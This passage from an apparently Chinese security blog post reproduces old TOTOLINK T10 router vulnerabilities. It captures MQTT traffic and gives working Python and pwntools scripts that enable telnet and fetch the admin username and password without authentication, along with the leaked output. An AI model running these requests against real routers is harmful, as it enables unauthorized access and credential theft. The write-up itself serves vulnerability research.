&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;checking &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; pcap_loop... no&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;configure: error: This is a bug, please follow the guidelines in CONTRIBUTING and include the&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;config.&lt;span class=&#34;built_in&#34;&gt;log&lt;/span&gt; file in your report.  If you have downloaded libpcap from&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcpdump.org, and built it yourself, please also include the config.&lt;span class=&#34;built_in&#34;&gt;log&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file from the libpcap source directory, the Makefile from the libpcap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  urce directory, and the output of the make process &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; libpcap, as&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;2010就好了&lt;/p&gt;
&lt;p&gt;不过最后还是有点问题,没有编译成功,暂时先放一下,在github上能搜到编译好的,先用着&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/badmonkey7/tcpdump-static&#34;&gt;https://github.com/badmonkey7/tcpdump-static&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;5-1-2-流量包分析&#34;&gt;&lt;a href=&#34;#5-1-2-流量包分析&#34; class=&#34;headerlink&#34; title=&#34;5.1.2 流量包分析&#34;&gt;&lt;/a&gt;5.1.2 流量包分析&lt;/h3&gt;&lt;p&gt;tcp开启监听,然后mqtt发送订阅(其实不行,这个包不完全,应该走80端口的服务才行)&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;response = requests.post(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&amp;quot;&lt;/span&gt;,data=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;&amp;quot;topicurl&amp;quot;:&amp;quot;setting/setTelnetCfg&amp;quot;,&amp;quot;telnet_enabled&amp;quot;:&amp;quot;1&amp;quot;&amp;#125;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;.&amp;#x2F;tcpdump-mipsel -i any  -w .&amp;#x2F;test1.pcap&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./tcpdump-mipsel -i lo -w ./test.pcap&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;获取流量后,利用base64编码把数据包拿到&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /tmp/test.pcap  | /tmp/busybox-mipsel base64        # 编码过程&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 将base64编码的内容保存到本地文件pcap64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat pcap64 | base64 -d &amp;gt; test.pcap          # 解码过程&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		不知道为什么一发送订阅,连接就挂了..所以开一个nohup来放到后台运行,断了后重新登录,kill掉进程就得到数据包了,并且如果想抓80的话,要多抓几个网卡,具体是哪个还没测试(-i any抓全部)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# ./tcpdump-mipsel -i lo -w ./test.pcap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tcpdump-mipsel: listening on lo, link-type &lt;span class=&#34;title function_&#34;&gt;EN10MB&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(Ethernet)&lt;/span&gt;, snapshot length 262144 bytes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection closed by foreign host.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./busybox-mipsel  nohup ./tcpdump-mipsel  -i any -w ./test.pcap&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		能够看到三次握手四次挥手以及订阅包,推送包等等&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514144610603.png&#34; alt=&#34;image-20230514144610603&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		基于上面分析,可以利用pwntools直接构造mqtt的数据包&lt;/p&gt;
&lt;h3 id=&#34;5-1-3-利用pwntools构造mqtt的数据包&#34;&gt;&lt;a href=&#34;#5-1-3-利用pwntools构造mqtt的数据包&#34; class=&#34;headerlink&#34; title=&#34;5.1.3 利用pwntools构造mqtt的数据包&#34;&gt;&lt;/a&gt;5.1.3 利用pwntools构造mqtt的数据包&lt;/h3&gt;&lt;p&gt;​		这条消息中的下面选中部分就是发送的设置telnet的mqtt publish报文,也就是脚本中的msg2&lt;/p&gt;
&lt;p&gt;31	1.735248	127.0.0.1	127.0.0.1	MQTT	175	Publish Message [totolink&amp;#x2F;router&amp;#x2F;setting&amp;#x2F;setTelnetCfg]&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514145035879.png&#34; alt=&#34;image-20230514145035879&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;192.168.55.1&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1883&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msg1 = &lt;span class=&#34;string&#34;&gt;&amp;quot;\x10\x1a\x00\x04\x4d\x51\x54\x54\x04\x02\x00\x3c\x00\x0e\x4d\x51\x54\x54\x5f\x46\x58\x5f\x43\x6c\x69\x65\x6e\x74&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msg2 = &lt;span class=&#34;string&#34;&gt;&amp;quot;\x30\x65\x00\x24\x74\x6f\x74\x6f\x6c\x69\x6e\x6b\x2f\x72\x6f\x75\x74\x65\x72\x2f\x73\x65\x74\x74\x69\x6e\x67\x2f\x73\x65\x74\x54\x65\x6c\x6e\x65\x74\x43\x66\x67\x7b\x0a\x09\x22\x74\x6f\x70\x69\x63\x75\x72\x6c\x22\x3a\x09\x22\x73\x65\x74\x74\x69\x6e\x67\x2f\x73\x65\x74\x54\x65\x6c\x6e\x65\x74\x43\x66\x67\x22\x2c\x0a\x09\x22\x74\x65\x6c\x6e\x65\x74\x5f\x65\x6e\x61\x62\x6c\x65\x64\x22\x3a\x09\x22\x31\x22\x0a\x7d&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(msg1)       &lt;span class=&#34;comment&#34;&gt;# connect&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sleep(&lt;span class=&#34;number&#34;&gt;0.2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(msg2)       &lt;span class=&#34;comment&#34;&gt;# setTelnetCfg 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;5-1-4-mqtt-fx使用&#34;&gt;&lt;a href=&#34;#5-1-4-mqtt-fx使用&#34; class=&#34;headerlink&#34; title=&#34;5.1.4 mqtt.fx使用&#34;&gt;&lt;/a&gt;5.1.4 mqtt.fx使用&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_43940932/article/details/107935303&#34;&gt;https://blog.csdn.net/weixin_43940932/article/details/107935303&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		这是一个调试mqtt协议的工具, 先修改mqtt代理的ip,就是路由器的ip,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509152828308.png&#34; alt=&#34;image-20230509152828308&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		subscribe订阅 #是订阅全部&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509153103381.png&#34; alt=&#34;image-20230509153103381&#34;&gt;&lt;/p&gt;
&lt;p&gt;publish,发送报文&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509153124891.png&#34; alt=&#34;image-20230509153124891&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;六、so库命令执行漏洞挖掘&#34;&gt;&lt;a href=&#34;#六、so库命令执行漏洞挖掘&#34; class=&#34;headerlink&#34; title=&#34;六、so库命令执行漏洞挖掘&#34;&gt;&lt;/a&gt;六、so库命令执行漏洞挖掘&lt;/h1&gt;&lt;p&gt;​		有命令执行的一般都要有system,execve 或者包装好的函数 CsteSystem,如果有交叉引用的漏洞函数,那么也可能存在命令执行&lt;/p&gt;
&lt;p&gt;一共9个文件.  后面有时间感觉可以写个ida脚本自动化来找…&lt;/p&gt;
&lt;h2 id=&#34;6-1-system-so&#34;&gt;&lt;a href=&#34;#6-1-system-so&#34; class=&#34;headerlink&#34; title=&#34;6.1 system.so&#34;&gt;&lt;/a&gt;6.1 system.so&lt;/h2&gt;&lt;p&gt;主要包含下面的函数&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;module_init&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getPasswordCfg&amp;quot;&lt;/span&gt;, getPasswordCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;setPasswordCfg&amp;quot;&lt;/span&gt;, setPasswordCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;NTPSyncWithHost&amp;quot;&lt;/span&gt;, NTPSyncWithHost);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getNTPCfg&amp;quot;&lt;/span&gt;, getNTPCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;setNTPCfg&amp;quot;&lt;/span&gt;, setNTPCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getDDNSStatus&amp;quot;&lt;/span&gt;, getDDNSStatus);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getDDNSCfg&amp;quot;&lt;/span&gt;, getDDNSCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;setDDNSCfg&amp;quot;&lt;/span&gt;, setDDNSCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getSyslogCfg&amp;quot;&lt;/span&gt;, getSyslogCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;clearSyslog&amp;quot;&lt;/span&gt;, clearSyslog);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;setSyslogCfg&amp;quot;&lt;/span&gt;, setSyslogCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getMiniUPnPConfig&amp;quot;&lt;/span&gt;, getMiniUPnPConfig);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;setMiniUPnPConfig&amp;quot;&lt;/span&gt;, setMiniUPnPConfig);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;LoadDefSettings&amp;quot;&lt;/span&gt;, LoadDefSettings);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;RebootSystem&amp;quot;&lt;/span&gt;, RebootSystem);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;FirmwareUpgrade&amp;quot;&lt;/span&gt;, FirmwareUpgrade);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getRebootScheCfg&amp;quot;&lt;/span&gt;, getRebootScheCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;setRebootScheCfg&amp;quot;&lt;/span&gt;, setRebootScheCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getTelnetCfg&amp;quot;&lt;/span&gt;, getTelnetCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;setTelnetCfg&amp;quot;&lt;/span&gt;, setTelnetCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;SystemSettings&amp;quot;&lt;/span&gt;, SystemSettings);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;6-1-1-getPasswordCfg-未授权获取用户名密码&#34;&gt;&lt;a href=&#34;#6-1-1-getPasswordCfg-未授权获取用户名密码&#34; class=&#34;headerlink&#34; title=&#34;6.1.1 getPasswordCfg 未授权获取用户名密码&#34;&gt;&lt;/a&gt;6.1.1 getPasswordCfg 未授权获取用户名密码&lt;/h3&gt;&lt;h4 id=&#34;mqtt-1883端口攻击&#34;&gt;&lt;a href=&#34;#mqtt-1883端口攻击&#34; class=&#34;headerlink&#34; title=&#34;mqtt 1883端口攻击&#34;&gt;&lt;/a&gt;mqtt 1883端口攻击&lt;/h4&gt;&lt;p&gt;totolink&amp;#x2F;router&amp;#x2F;setting&amp;#x2F;getPasswordCfg&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;topicurl&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;setting/getPasswordCfg&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;会直接返回用户名密码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509154711114.png&#34; alt=&#34;image-20230509154711114&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;80端口攻击&#34;&gt;&lt;a href=&#34;#80端口攻击&#34; class=&#34;headerlink&#34; title=&#34;80端口攻击&#34;&gt;&lt;/a&gt;80端口攻击&lt;/h4&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;response = requests.post(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&amp;quot;&lt;/span&gt;,data=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;&amp;quot;topicurl&amp;quot;:&amp;quot;setting/getPasswordCfg&amp;quot;&amp;#125;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(response.text)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;效果&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(base) ➜  router python3 password.&lt;span class=&#34;built_in&#34;&gt;exp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;admuser&amp;quot;&lt;/span&gt;:	&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;admpass&amp;quot;&lt;/span&gt;:	&lt;span class=&#34;string&#34;&gt;&amp;quot;123456888&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;GetLanguageCfg也可以,不过不在system.so这里&lt;/p&gt;
&lt;h3 id=&#34;6-1-2-setPasswordCfg-未授权修改密码&#34;&gt;&lt;a href=&#34;#6-1-2-setPasswordCfg-未授权修改密码&#34; class=&#34;headerlink&#34; title=&#34;6.1.2 setPasswordCfg 未授权修改密码&#34;&gt;&lt;/a&gt;6.1.2 setPasswordCfg 未授权修改密码&lt;/h3&gt;&lt;p&gt;totolink&amp;#x2F;router&amp;#x2F;setting&amp;#x2F;setPasswordCfg&lt;/p&gt;
